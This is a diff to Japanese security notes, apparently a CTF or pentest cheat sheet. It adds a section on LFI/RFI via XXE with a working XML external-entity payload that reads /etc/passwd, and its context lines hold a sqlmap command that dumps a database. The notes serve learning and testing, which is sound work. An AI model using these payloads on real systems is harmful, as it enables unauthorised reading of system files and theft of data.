@@ -1007,6 +1007,8 @@ sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
 
 [XXE とは？徳丸先生の解説](https://blog.tokumaru.org/2017/)
 
+- PHP filter を利用した攻撃
+
 PHPでXXE攻撃する場合、以下のようにPHPフィルタを用いてBASE64エンコードするという技が知られている。
 
 ```
@@ -1020,6 +1022,26 @@ PHPでXXE攻撃する場合、以下のようにPHPフィルタを用いてBASE6
 		</bugreport>
 
 ```
+
+- XXE による LFI / RFI
+XXE による LFI / RFI（Local File Inclusion / Remote File Inclusion）では、外部実体参照を利用することで、
+
+本来アクセスできない領域（ローカル・リモート）にあるファイルへアクセスできる。
+
+
+XXE による LFI では、外部実体参照の記法を用いる。
+例えば以下の XML を利用すると、脆弱なサーバ内の機密データにアクセスできる。
+
+<!DOCTYPE data [
+<!ENTITY secretData SYSTEM "file:///etc/passwd">
+]>
+<data>
+  &secretData;
+</data>
+
+</data>
+ここでは、 file:// スキームを利用することで、ローカルファイル内にある /etc/passwd というセンシティブなファイルを表示させるような XML となっている。
+
 
 ## LFI
 
